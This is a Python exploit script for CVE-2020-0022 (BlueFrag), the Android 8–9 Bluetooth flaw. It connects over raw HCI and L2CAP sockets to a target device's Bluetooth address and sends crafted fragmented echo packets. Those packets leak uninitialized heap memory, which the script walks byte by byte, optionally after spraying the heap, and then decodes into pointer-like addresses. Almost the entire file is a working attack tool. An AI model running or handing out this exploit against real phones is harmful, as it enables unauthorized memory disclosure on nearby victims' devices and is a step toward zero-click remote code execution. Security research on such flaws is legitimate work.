# coding: utf-8

################################################################################
# CVE-2020-0022 vulnerability exploitation
# By Polo35 - 2020/05/23
#
# Usage: python polo_leak.py target_bt_mac loop_max walk_max echo_before_walk send_frame_delay spray_heap verbose
#
# Use a memcpy of 0 length to get 4 bytes of uninitialized data
# Increase packets length to "walk" the memory and try to chain found data
#
# Based on scripts by Jan Ruge
# CVE-2020-0022 an Android 8.0-9.0 Bluetooth Zero-Click RCE – BlueFrag
# https://insinuator.net/2020/04/cve-2020-0022-an-android-8-0-9-0-bluetooth-zero-click-rce-bluefrag/
################################################################################

from __future__ import print_function

import os
import sys
import socket
import struct
import time
import datetime
from binascii import hexlify, unhexlify
from thread import start_new_thread

################################################################################
# Script initialization
################################################################################

# Initialize the variables
l2cap = False
pkt = False
echo = False
handle = False
dst_len = 0
src_len = 0
l2cap_len_adj = 4
echo_count = 0
dest_max = 634
src_max = 639
loop_count = 0
walk_count = 0
walking_mode = 1
ident_start = 0x10
ident = ident_start
leak_list = []
echo_list = []
temp_echo_list = []
last_message_time = datetime.datetime.now()
force_verbose = False

# Get the arguments
#os.system('clear')
if len(sys.argv) > 7:
    target_mac = sys.argv[1]
    loop_max = int(sys.argv[2], 0)
    walk_max = int(sys.argv[3], 0)
    echo_before_walk = int(sys.argv[4], 0)
    send_frame_delay = float(sys.argv[5])
    spray_heap = int(sys.argv[6], 0)
    verbose = int(sys.argv[7], 0)
elif len(sys.argv) > 6:
    target_mac = sys.argv[1]
    loop_max = int(sys.argv[2], 0)
    walk_max = int(sys.argv[3], 0)
    echo_before_walk = int(sys.argv[4], 0)
    send_frame_delay = float(sys.argv[5])
    spray_heap = int(sys.argv[6], 0)
    verbose = 0
elif len(sys.argv) > 5:
    target_mac = sys.argv[1]
    loop_max = int(sys.argv[2], 0)
    walk_max = int(sys.argv[3], 0)
    echo_before_walk = int(sys.argv[4], 0)
    send_frame_delay = float(sys.argv[5])
    spray_heap = 0
    verbose = 0
elif len(sys.argv) > 4:
    target_mac = sys.argv[1]
    loop_max = int(sys.argv[2], 0)
    walk_max = int(sys.argv[3], 0)
    echo_before_walk = int(sys.argv[4], 0)
    send_frame_delay = 0.0
    spray_heap = 0
    verbose = 0
elif len(sys.argv) > 3:
    target_mac = sys.argv[1]
    loop_max = int(sys.argv[2], 0)
    walk_max = int(sys.argv[3], 0)
    echo_before_walk = 16
    send_frame_delay = 0.0
    spray_heap = 0
    verbose = 0
elif len(sys.argv) > 2:
    target_mac = sys.argv[1]
    loop_max = int(sys.argv[2], 0)
    walk_max = 634
    echo_before_walk = 16
    send_frame_delay = 0.0
    spray_heap = 0
    verbose = 0
elif len(sys.argv) > 1:
    target_mac = sys.argv[1]
    loop_max = 1
    walk_max = 364
    echo_before_walk = 16
    send_frame_delay = 0.0
    spray_heap = 0
    verbose = 0
else:
    print ("Usage: python polo_leak.py target_bt_mac loop_max walk_max echo_before_walk send_frame_delay spray_heap verbose")
    sys.exit(0)

print ("Using cve-2020-0022 vulnerability on arm target %s" % target_mac)
print ("loop_max %d" % loop_max)
print ("walk_max %d" % walk_max)
print ("echo_before_walk %d" % echo_before_walk)
print ("send_frame_delay %d ms" % round(send_frame_delay * 1000))
print ("spray_heap %d" % spray_heap)
print ("verbose %d" % verbose)

################################################################################
# Logger class allowing to save debug print_log to log file
################################################################################
class Logger(object):
    def __init__(self):
        self.terminal = sys.stdout
        cwd = os.getcwd()
        if not os.path.isdir(cwd + "/logs"):
            os.mkdir(cwd + "/logs")
        output_filename = cwd + "/logs/log_leak_" + datetime.datetime.now().strftime("%d-%m-%Y_%H-%M-%S.log")
        if os.path.exists(output_filename):
            output_filename = cwd + "/logs/log_leak_" + datetime.datetime.now().strftime("%d-%m-%Y_%H-%M-%S_1.log")
        print ("Saving log to %s" % output_filename)
        self.log = open(output_filename, "w")

    def write(self, message):
        global verbose
        global force_verbose
        if verbose:
            force_verbose = True
            if message.endswith("\r"):
                message = message.replace("\r", "\n")
        if force_verbose:
            self.terminal.write(message)
        self.log.write(message)

    def flush(self):
        pass

# Initialize the logger
sys.stdout = Logger()


################################################################################
# Function definitions
################################################################################
def print_log(*args, **kwargs):
    global force_verbose
    force_verbose = False
    print(*args, **kwargs)
    force_verbose = False
    sys.stdout.flush()

def print_console(*args, **kwargs):
    global force_verbose
    global last_message_time
    # Write to terminal anyway
    force_verbose = True
    print(*args, **kwargs)
    force_verbose = False
    sys.stdout.flush()

def print_console_delayed(*args, **kwargs):
    global verbose
    global force_verbose
    global last_message_time
    if verbose:
        # Write to terminal anyway
        force_verbose = True
    else:
        # Write to terminal every seconds
        elapsed_time = datetime.datetime.now() - last_message_time
        if elapsed_time.microseconds >= 1000:
            force_verbose = True
            last_message_time = datetime.datetime.now()
    print(*args, **kwargs)
    force_verbose = False
    sys.stdout.flush()

def pattern(n):
    return "".join([chr(i%255) for i in xrange(n)])

def valid_addr(addr):
    return addr < 0xB0000000 \
       and addr > 0x50000000

def valid_mark(mark):
    return mark == 0x41414141 \
        or mark == 0x41414100 \
        or mark == 0x00414141 \
        or mark == 0x41410000 \
        or mark == 0x00414100 \
        or mark == 0x00004141 \
        or mark == 0x41000000 \
        or mark == 0x00410000 \
        or mark == 0x00004100 \
        or mark == 0x00000041 \
        or mark == 0x42424242 \
        or mark == 0x42424200 \
        or mark == 0x00424242 \
        or mark == 0x42420000 \
        or mark == 0x00424200 \
        or mark == 0x00004242 \
        or mark == 0x42000000 \
        or mark == 0x00420000 \
        or mark == 0x00004200 \
        or mark == 0x00000042 \
        or mark == 0x43434343 \
        or mark == 0x43434300 \
        or mark == 0x00434343 \
        or mark == 0x43430000 \
        or mark == 0x00434300 \
        or mark == 0x00004343 \
        or mark == 0x43000000 \
        or mark == 0x00430000 \
        or mark == 0x00004300 \
        or mark == 0x00000043

def recv_l2cap():
    global l2cap
    global pkt
    global echo
    global handle
    while True:
        try:
            while True:
                pkt = l2cap.recv(10240) # Just something long.
                if ord(pkt[0]) == 0x9:  # ECHO RESP
                    print_log ("ECHO %s" % hexlify(pkt))
                    echo = pkt
                elif ord(pkt[0]) == 0x1:
                    print_log ("Rejected %s" % hexlify(pkt))
                    #_, cmd, l, code = struct.unpack("<BBHH", pkt)
                    #print_log "Rejected cmd=%x len=%x code=%x" % (cmd, l, code)

                #else:
                    print_log ("Unknow %s" % hexlify(pkt))
        #lost connection
        except:
            print_console ("\033[;31mLost connection\033[;00m%s" % (" "*100), end="\r")
            handle = False
            while not handle:
                try:
                    if l2cap:
                        l2cap.close()
                    print_console ("Connecting", end="\r")
                    l2cap = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
                    l2cap.connect((target_mac, 0))
                    time.sleep(2)
                except socket.error:
                    print_console ("Retry", end="\r")
                    time.sleep(2)

def recv_hci():
    global handle
    while True:
        pkt = hci.recv(1024)
        if ord(pkt[0]) == 0x04 and ord(pkt[1]) == 0x03 and ord(pkt[3]) == 0:
            if not handle:
                handle = struct.unpack("<H", pkt[4:6])[0]
                #handle = u16(pkt[4:6])
                if echo_count == 0:
                    print_console ("Got connection handle 0x%X" % handle)
                    print_console ("Recieved hci echo: %s" % hexlify(pkt))
                else:
                    print_console ("Got connection handle 0x%X" % handle, end="\r")

        print_log ("recv_hci: %s" % hexlify(pkt))

def send_echo_hci(ident, x, l2cap_len_adj=0, first_packet=0, continuation_flags=0):
    global handle
    while not handle:
        time.sleep(0.01)

    l2cap_hdr = struct.pack("<BBH",0x8, ident, len(x) + l2cap_len_adj) #command identifier len
    acl_hdr = struct.pack("<HH", len(l2cap_hdr) + len(x) + l2cap_len_adj, 1) #len cid

    packet_handle = handle
    if first_packet:
        packet_handle |= 1 << 13 # PB Flag: First Automatically Flushable Packet (2)
    if continuation_flags:
        packet_handle |= 1 << 12 # PB Flag: Continuing Fragment (1)
    hci_hdr = struct.pack("<HH", packet_handle, len(acl_hdr) + len(l2cap_hdr) + len(x)) #handle, len

    print_log ("send_echo_hci => ident: %s" % hex(ident))
    print_log ("send_echo_hci => l2cap_len_adj: %d" % l2cap_len_adj)
    print_log ("send_echo_hci => continuation_flags: %d" % continuation_flags)
    print_log ("send_echo_hci => len(hci_hdr): %d" % len(hci_hdr))
    print_log ("send_echo_hci => len(acl_hdr): %d" % len(acl_hdr))
    print_log ("send_echo_hci => len(l2cap_hdr): %d" % len(l2cap_hdr))
    print_log ("send_echo_hci => len(x): %d" % len(x))
    print_log ("send_echo_hci => len(packet): %d" % (len(hci_hdr) + len(acl_hdr) + len(l2cap_hdr) + len(x)))
    print_log ("send_echo_hci => data: %s" % hexlify("\x02" + hci_hdr + acl_hdr + l2cap_hdr + x))

    hci.send("\x02" + hci_hdr + acl_hdr + l2cap_hdr + x)


def do_leak(ident=42, dst_len=70, src_len=70, l2cap_len_adj=2):
    global echo
    global handle
    echo = False
    while not echo:
        while handle == 0:
            pass
        send_echo_hci(ident, pattern(dst_len), l2cap_len_adj=l2cap_len_adj, first_packet=1)
        send_echo_hci(ident+1, "B"*src_len, continuation_flags=1)
        timeout = 100
        while not echo and handle and timeout > 0:
            time.sleep(0.01)
            timeout -= 1
        if timeout <= 0:
            print_log ("do_leak timeout")
            return False
    return echo

################################################################################
# Start of main
################################################################################

while loop_count < loop_max:
    # Initialize the variables
    dst_len = 0
    src_len = 0
    l2cap_len_adj = 4
    echo_count = 0
    loop_count += 1
    walk_count = 0
    walking_mode = 1
    ident = ident_start
    leak_list = []
    echo_list = []
    temp_echo_list = []
    # Initialize hci
    print_console ("\nInitializing HCI...")
    os.system("hciconfig hci0 down")
    os.system("hciconfig hci0 up")
    os.system("hciconfig hci0 sspmode 0")
    os.system("hcitool dc " + target_mac)
    hci = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
    hci.setsockopt(socket.SOL_HCI, socket.HCI_DATA_DIR,1)
    hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00')
    hci.bind((0,))
    start_new_thread(recv_hci, ())
    l2cap = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
    l2cap.connect((target_mac, 0))
    start_new_thread(recv_l2cap, ())

    # Wait connection handle
    wait_count = 0
    while handle == 0:
        wait_count += 1
        if (wait_count >= 10):
            wait_count = 1
        print_console ("Waiting for connection handle%s" % ("."*wait_count), end="\r")
        time.sleep(0.5)

    print_console ("Walking %d bytes of memory...\n" % walk_max)

    # Start sending fragmented packets to get leaks
    start_time = datetime.datetime.now()
    while walk_count < walk_max:
        # Check if still connected
        if handle:
            #write data to heap if needed
            if spray_heap:
                spray_heap_data = pattern(600)
                for i in xrange(100):
                    send_echo_hci(ident, spray_heap_data, first_packet=1)
                    ident += 1
                    if (ident >= 0xfa):
                        ident = ident_start
                time.sleep(send_frame_delay)
            # Send packets with fragmentation
            # The received echo ens with 4 bytes of unintialized memory
            echo = do_leak(ident=ident, dst_len=dst_len, src_len=src_len, l2cap_len_adj=l2cap_len_adj)
            # Check if we found some interesting data
            if echo and (len(echo) == 4 + dst_len + l2cap_len_adj):
                echo_count += 1
                total_time = datetime.datetime.now() - start_time
                print_console_delayed ("%d seconds / walk %d / dest %d / src %d / l2cap_len %d / echo %d / received echo %s %s" % (total_time.seconds, walk_count, dst_len, src_len, l2cap_len_adj, echo_count, hexlify(echo[-4:]), " "*34), end="\r")
                # Add 4 last bytes of the echo to the echo list
                echo_list.append(echo[-4:])
                temp_echo_list.append(echo[-4:])
                # Check if there is enough echo in the echo list
                if (len(temp_echo_list) >= echo_before_walk):
                    # Choose best byte in the echo list by counting the repetitions of byte
                    best_leak = "X"
                    best_echo_count = 0
                    for i in xrange(len(temp_echo_list) - 1):
                        same_echo_count = 0
                        for j in xrange(len(temp_echo_list) - 1):
                            if  (i != j) \
                            and (temp_echo_list[j][:1] != "\x00") \
                            and (temp_echo_list[j][:1] != "\x41") \
                            and (temp_echo_list[j][:1] == temp_echo_list[i][:1]):
                                same_echo_count += 1
                        if same_echo_count > best_echo_count:
                            best_echo_count = same_echo_count
                            best_leak = temp_echo_list[i][:1]
                            print_log ("%d seconds / walk %d / same echo count %d / leak1 %s" % (total_time.seconds, walk_count, same_echo_count, hexlify(best_leak)))
                    # If not found select first not 0x00 or 0x41
                    if best_leak == "X":
                        for i in xrange(len(temp_echo_list) - 1):
                            if  (temp_echo_list[i][:1] != "\x00") \
                            and (temp_echo_list[i][:1] != "\x41"):
                                best_leak = temp_echo_list[i][:1]
                                print_log ("%d seconds / walk %d / same echo count %d / leak2 %s" % (total_time.seconds, walk_count, same_echo_count, hexlify(best_leak)))
                    # If not found retry with 0x00 included
                    if best_leak == "X":
                        best_echo_count = 0
                        for i in xrange(len(temp_echo_list) - 1):
                            same_echo_count = 0
                            for j in xrange(len(temp_echo_list) - 1):
                                if  (i != j) \
                                and (temp_echo_list[j][:1] != "\x41") \
                                and (temp_echo_list[j][:1] == temp_echo_list[i][:1]):
                                    same_echo_count += 1
                            if same_echo_count > best_echo_count:
                                best_echo_count = same_echo_count
                                best_leak = temp_echo_list[i][:1]
                                print_log ("%d seconds / walk %d / same echo count %d / leak3 %s" % (total_time.seconds, walk_count, same_echo_count, hexlify(best_leak)))
                    # If not found retry with all included
                    if best_leak == "X":
                        best_echo_count = 0
                        for i in xrange(len(temp_echo_list) - 1):
                            same_echo_count = 0
                            for j in xrange(len(temp_echo_list) - 1):
                                if  (i != j) \
                                and (temp_echo_list[j][:1] == temp_echo_list[i][:1]):
                                    same_echo_count += 1
                            if same_echo_count > best_echo_count:
                                best_echo_count = same_echo_count
                                best_leak = temp_echo_list[i][:1]
                                print_log ("%d seconds / walk %d / same echo count %d / leak4 %s" % (total_time.seconds, walk_count, same_echo_count, hexlify(best_leak)))
                    # Add the byte with the max number of repetitions
                    leak_list.append(best_leak)
                    # Clear the echo list
                    temp_echo_list = []
                    # Print some info
                    total_time = datetime.datetime.now() - start_time
                    print_console_delayed ("%d seconds / walk %d / dest %d / src %d / l2cap_len %d / echo %d / get leaked byte %s / walking to next byte" % (total_time.seconds, walk_count, dst_len, src_len, l2cap_len_adj, echo_count, hexlify(best_leak)), end="\r")
                    # Increase destination or l2capadjust length to walk memory
                    if walking_mode:
                        src_len = 0
                        dst_len += 1
                        l2cap_len_adj = 4
                        if dst_len >= dest_max:
                            src_len = dest_max
                            dst_len = 0
                            walking_mode = 0
                    else:
                        src_len = src_max
                        dst_len = 0
                        l2cap_len_adj +=1
                        if l2cap_len_adj >= src_max:
                            walking_mode = 1
                            l2cap_len_adj = 4
                    # Increase walk count
                    walk_count += 1
            elif echo:
                print_console ("Echo malformed => len(echo): %d" % len(echo))
            time.sleep(send_frame_delay)
            ident += 1
            if (ident >= 0xfa):
                ident = ident_start
        else:
            time.sleep(1)
            ident = ident_start

    total_time = datetime.datetime.now() - start_time
    print_console ("\rWalked %d bytes in %d seconds with %d echo received %s" % (walk_count, total_time.seconds, echo_count, " "*60))

    # Print found data
    i = 0
    print_buffer = ""
    print_console ("\nLeak hex:")
    for leak in leak_list:
        print_buffer += hexlify(leak)
        i += 1
        if (i % 16 == 0):
            print_console (print_buffer)
            print_buffer = ""
    if print_buffer != "":
        print_console (print_buffer)

    leak_hex = ""
    print_console ("\nLeak string:")
    for leak in leak_list:
        leak_hex += leak
    leak_string = "".join(map(lambda x: "." if ord(x)<0x20 or ord(x)>0x7e else x, leak_hex))
    i = 0
    if len(leak_string) < 64:
        print_console ("%s" % (leak_string))
    else:
        while i < len(leak_string) - 4:
            print_console ("%s" % (leak_string[i:i+64]))
            i += 64

    print_console ("\nLeak unpacked:")
    leak_hex_len = len(leak_hex)
    leak = struct.unpack("L"*(leak_hex_len/4), leak_hex[:(leak_hex_len/4)*4])
    for i in xrange(len(leak)/4):
        for j in xrange(4):
            if i*4+j < len(leak):
                if valid_mark(leak[i*4+j]):
                    print_console ("\033[;31m0x%08x\033[;0m" % leak[i*4+j], end=" ")
                elif valid_addr(leak[i*4+j]):
                    print_console ("\033[;32m0x%08x\033[;0m" % leak[i*4+j], end=" ")
                else:
                    print_console ("0x%08x" % leak[i*4+j], end=" ")
        print_console ("")

    # Save all received echo to log file
    i = 0
    print_buffer = ""
    print_log ("\nEcho hex: ")
    for echo in echo_list:
        print_buffer += hexlify(echo)
        i += 1
        if (i % 16 == 0):
            print_log (print_buffer)
            print_buffer = ""
    if print_buffer != "":
        print_log (print_buffer)
    echo_hex = ""
    print_log ("\nEcho string:")
    for echo in echo_list:
        echo_hex += echo
    echo_string = "".join(map(lambda x: "." if ord(x)<0x20 or ord(x)>0x7e else x, echo_hex))
    i = 0
    if len(echo_string) < 64:
        print_log ("%s" % (echo_string))
    else:
        while i < len(echo_string) - 4:
            print_log ("%s" % (echo_string[i:i+64]))
            i += 64

print_console ("Done")